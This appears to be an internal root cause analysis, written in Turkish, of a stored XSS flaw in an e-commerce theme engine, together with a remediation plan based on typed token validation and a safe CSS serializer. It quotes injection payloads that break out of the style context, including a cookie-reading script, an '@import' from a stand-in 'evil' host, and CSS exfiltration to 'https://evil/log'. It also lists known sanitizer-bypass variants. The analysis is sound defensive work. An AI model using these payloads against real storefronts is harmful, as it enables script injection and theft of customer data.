# H-1 — Theme Token Stored XSS (Kök Neden Analizi)

**Tarih:** 2026-07-28
**Önem:** HIGH (stored XSS / storefront render manipülasyonu)
**Kapsam:** Enterprise Theme Engine (ADR-087) token değerlerinin storefront `<style>`
bağlamına doğrulanmadan enjekte edilmesi.
**İlgili teknik borç:** TD-134 (theme token typed validation), TD-147 (CSP hardening — bkz. §11).

---

## 1. Güvenlik invariant'ı

> Tema token değerleri **serbest CSS değildir.** Yalnız tanımlı token tipi ve
> formatına uygun değerler kabul edilir ve **tek bir güvenli, typed CSS
> serializer** üzerinden render edilir.

Bu analizden önce sistem bu invariant'ı **sağlamıyordu.**

---

## 2. Zafiyet zinciri (data flow)

```
Theme Studio (admin) ──PUT /draft──▶ gateway saveDraft ──▶ ThemeVersion.document (JSON, DB)
                                                                    │
                        publish ─────────────────────────────────▶ │
                                                                    ▼
storefront layout.tsx  ◀── GET /public/stores/:slug/theme ── generateStorefrontThemeCss(document)
   <style id="commerce-os-theme"                                    │  (packages/theme/src/css.ts)
     dangerouslySetInnerHTML={{ __html: theme.css }} />  ◀──────────┘
```

**Üç render sink'i, tek serializer:**

| # | Yüzey | Kod | Girdi | Sink |
|---|-------|-----|-------|------|
| 1 | Storefront (yayınlanmış) | `apps/storefront-web/app/layout.tsx:96` | gateway `/public/.../theme` → `generateStorefrontThemeCss` | `<style dangerouslySetInnerHTML>` |
| 2 | Gateway preview (draft) | `apps/api-gateway/src/theme/routes.ts:357` | `generateStorefrontThemeCss(draftDoc)` | store-admin preview iframe/style |
| 3 | Store-admin canlı önizleme | `apps/store-admin-web/app/(app)/theme/theme-studio.tsx:253,463` | `generateThemeStylesheet(doc)` (client-side) | `<style dangerouslySetInnerHTML>` |

Üçü de `packages/theme/src/css.ts` içindeki **aynı** `generateCssVariables` /
`generateThemeStylesheet` fonksiyonuna dayanır. Bu, savunma için avantajdır:
**serializer güvenli hale getirilince üç sink birden kapanır** ve preview/publish
parity otomatik korunur (ayrı "unsafe preview serializer" yoktur).

---

## 3. Kök neden

### 3.1 Şema doğrulaması değeri "CSS-güvenli" olarak doğrulamıyor

`packages/theme/src/schema.ts` içinde primitive token değerleri yalnızca:

```ts
const zConcrete = z.string().min(1).refine((v) => !isTokenRef(v), …);
```

ile doğrulanır — yani **boş olmayan, `{ref}` biçiminde olmayan herhangi bir
string.** Renk gerçekten renk mi, uzunluk gerçekten uzunluk mu **denetlenmez.**
Bir admin (veya bozuk/legacy veri) `tokens.brand.primary` değerine şunu
yazabilir:

```
red;}</style><script>alert(document.cookie)</script><style>{
```

`generateThemeStylesheet` bunu doğrudan `--accent: red;}</style><script>…` olarak
`<style>` bloğuna basar → **stored XSS.**

### 3.2 `passthrough()` bilinmeyen anahtar enjeksiyon vektörü

Tüm token grupları `.passthrough()` olduğundan şema **bilinmeyen anahtarları**
(ör. `tokens.brand.evil = "…</style>…"`) sessizce kabul eder. `css.ts` bu ek
anahtarları `--ds-brand-evil` olarak yayınlar → doğrulanmamış ikinci enjeksiyon
yolu.

### 3.3 Serializer ham değeri güvenilir sayıyor

`generateCssVariables` çözülmüş değeri hiçbir doğrulamadan geçirmeden
`--name: value;` satırına yazar. `customCss` `sanitizeCustomCss`'ten geçse de
**token değerleri hiçbir savunmadan geçmez.**

---

## 4. Style context'ini kıran payload sınıfları

| Payload | Kırış mekanizması |
|---------|-------------------|
| `red;}body{display:none` | `;}` ile deklarasyon+kural kaçışı → keyfi CSS |
| `</style><script>alert(1)</script>` | `<style>` etiketinden kaçış → keyfi HTML/JS |
| `url("javascript:alert(1)")` | (eski tarayıcı) javascript URI |
| `@import url(https://evil/x.css)` | harici stylesheet çekme (exfil/override) |
| `/* … */` | yorum breakout ile deklarasyon manipülasyonu |
| `";background:url(https://evil/log?c=…)` | tırnak kaçışı + harici istek (CSS exfil) |
| `expression(alert(1))` | (eski IE) dinamik ifade |

Not: `dangerouslySetInnerHTML` ile enjekte edilen `<style>` **React kaçışından
geçmez**; React yalnızca JSX text/attribute'ları kaçırır. `__html` ham gövdedir.

---

## 5. Hangi token alanları doğrudan CSS string'ine giriyor

`css.ts` şu değişkenleri üretir (hepsi sink'e girer):

- **Storefront uyum varları** (`STOREFRONT_VAR_BINDINGS`): `--paper --surface
  --surface-muted --ink --ink-muted --ink-subtle --line --line-strong --accent
  --accent-ink --accent-contrast` (COLOR), `--font-sans --font-serif`
  (FONT_FAMILY), `--radius-none --radius-sm --radius-md` (LENGTH), `--shadow-sm
  --shadow-md` (SHADOW).
- **`--ds-*` primitive katmanı:** `tokens.<grup>.<anahtar>`'ların tamamı —
  brand/surface/text/border/feedback (COLOR), typography
  (FONT_FAMILY/LENGTH/NUMBER/FONT_WEIGHT), radius/layout/breakpoints (LENGTH),
  shadow (SHADOW), motion (DURATION/EASING/NUMBER), zIndex (NUMBER).
- **`--ds-*` semantic katmanı:** `page.* content.* line.* action.* status.*` —
  tümü COLOR (ya `{ref}` ya somut, ör. `action.primaryContrast`).
- **`--ds-*` component katmanı:** her bileşenin token'ları — `radius`→LENGTH,
  `shadow`→SHADOW, geri kalanı COLOR.

**Sonuç:** Şema `min(1) string` kabul ettiği için **yukarıdaki her alan** bir
enjeksiyon vektörüdür. En kritikleri renk alanları (admin UI serbest metin
girişi sunar — `theme-studio.tsx` COLOR_FIELDS, radius, font inputları).

---

## 6. Preview ve published aynı sink'i kullanıyor mu?

**Evet.** §2'deki üç yol da `generateStorefrontThemeCss`/`generateThemeStylesheet`'e
bağlanır. Ayrı bir "unsafe preview" yolu **yok.** Bu nedenle serializer'ı
sertleştirmek preview + published + admin-canlı-önizleme parity'sini korur
(§13). Save-time doğrulama draft'ta uygulanır; render-time savunma üç sink'te de
etkindir.

---

## 7. Stored payload hangi storefront yüzeylerinde render oluyor?

`<style id="commerce-os-theme">` **root layout**'ta (`layout.tsx`) enjekte edilir
→ **her storefront sayfası** (ana sayfa, PLP, PDP, sepet, checkout, hesap, arama…)
etkilenir. Tema store-scoped olduğundan payload yalnız o mağazanın vitrinini
etkiler; ancak o mağazanın **tüm** ziyaretçilerine sunulur (kalıcı/stored).

---

## 8. Yalnız admin yazabiliyor olsa bile neden güvenlik açığı?

1. **Ayrıcalık yükseltme / yatay hareket:** Store-admin ≠ platform owner. Bir
   mağaza operatörü (veya ele geçirilmiş/az-ayrıcalıklı admin oturumu) tema
   yoluyla mağaza vitrininde **müşteri tarayıcısında** çalışan script enjekte
   edebilir → müşteri oturumu/çerez/ödeme akışı hedefi (stored XSS, admin
   sınırını aşıp son-kullanıcıya ulaşır).
2. **Legacy/bozuk veri:** Import (`/themes/import`), seed, geçmiş sürümler veya
   manuel DB düzeltmeleri şema-öncesi/geçersiz token içerebilir; save-time
   validation eklense bile **DB'de zaten** geçersiz değer bulunabilir → §10
   render-time savunma şart.
3. **CSRF/oturum devri:** Admin yazma uçları CSRF korumalı olsa da, derinlemesine
   savunma (defense-in-depth) prensibi tek bir kontrole güvenmemeyi gerektirir.
4. **Denetlenebilirlik:** "Güvenilir girdi" varsayımı ilk ihlal edildiğinde
   (tedarikçi entegrasyonu, çok-kiracılı yeniden satış, white-label) sessizce
   sömürülebilir bir yola dönüşür.

---

## 9. Çözüm mimarisi (bu PR)

1. **Token registry** (`packages/theme/src/registry.ts`) — her token'ın tipi +
   doğrulama/normalize politikası; bilinmeyen primitive anahtarı reddedilir;
   generic `string` tipi yok.
2. **Typed validators** (`packages/theme/src/validate.ts`) — COLOR / LENGTH /
   NUMBER / FONT_FAMILY_PRESET / FONT_WEIGHT / SHADOW_PRESET / DURATION / EASING;
   parse + range + canonical normalize; regex-only değil.
3. **Güvenli serializer** (`css.ts`) — her değeri tipine göre doğrular; geçersiz
   → satır **atlanır** (render-time defense, §10); bilinmeyen anahtar hiç
   yayınlanmaz. `collectThemeTokenIssues(doc)` save-time API'si.
4. **Save-time defense** (gateway) — draft kaydet/publish token doğrulaması;
   `THEME_TOKEN_UNKNOWN / THEME_TOKEN_INVALID_VALUE / THEME_TOKEN_TYPE_MISMATCH /
   THEME_TOKEN_UNSAFE_VALUE / THEME_PUBLISH_BLOCKED` kodları (ham payload/regex
   response'a **dönmez**).
5. **Font/Shadow preset policy** — ham `font-family`/`box-shadow` kabul edilmez;
   preset ID + kanonik allowlist → güvenli sabit değere map.
6. **Legacy tarama** (`packages/db/scripts/security/scan-theme-tokens.mjs`) —
   salt-okunur; geçersiz kayıtları raporlar, sessiz mutate etmez.

---

## 10. Neden save-time yeterli değil (render-time defense zorunlu)

DB'de **halihazırda** geçersiz/legacy token bulunabilir (import, seed, geçmiş
sürüm, manuel düzeltme). Save-time validation yalnız ileriye dönük yazmaları
korur. Bu yüzden serializer **render anında** her token'ı registry üzerinden
tekrar doğrular; geçersizi güvenli biçimde atlar (diğer geçerli tokenlar çalışır,
sayfa kırılmaz, ham değer `<style>`'a girmez, payload **loglanmaz**).

---

## 11. CSP değerlendirmesi

Kod tabanında **hiç CSP başlığı yok** (`grep Content-Security-Policy` → 0 sonuç).
`<style dangerouslySetInnerHTML>` tarayıcı katmanında tamamen korumasız. CSP bu
zafiyetin **ana** çözümü değildir (token validation + serializer zorunlu ve
yeterli), ancak derinlemesine savunma için değerlidir. Inline `<style>` nonce/hash
uygulaması ayrı, geniş bir iştir → **TD-147 — Storefront CSP hardening** olarak
açılır. Bu PR CSP'yi yeniden tasarlamaz.

---

## 12. Custom CSS regresyonu

`sanitizeCustomCss` (`custom-css.ts`) zaten `</style>`, HTML etiketleri,
`@import`, `expression()`, `javascript:`, `behavior:`, `-moz-binding`, `@charset`
kaldırıyor. Bu PR kapsamında bypass yüzeyleri (ör. `\3c script`, `/*…*/` yorum
breakout, `\00003c`, `@import` boşluk/newline varyantları) regresyon açısından
gözden geçirilir ve gerekiyorsa sertleştirilir. Büyük CSS sandbox sistemi bu
fazda **kurulmaz.**

---

## 13. Parity ve geriye-uyum kısıtı

`css.test.ts` **VARSAYILAN tema**'nın `globals.css` `[data-theme="default"]`
bloğunu **birebir** ürettiğini doğrular (temasız mağaza değişmemeli). Bu nedenle
validator'lar meşru varsayılan değerleri (`#735389`, modern
`rgb(23 20 15 / 0.28)` boşluk-sözdizimi, `var(--font-serif-face), …` font
stack'leri, `0 20px 48px -28px rgb(…)` shadow'ları, `cubic-bezier(…)` easing)
**kabul etmek zorundadır.** Validator'lar bu somut varsayılan set üzerinden test
edilir. Font/shadow için allowlist doğrudan `DEFAULT_TYPOGRAPHY`/`DEFAULT_SHADOW`
sabitlerinden türetilir → daima parity.
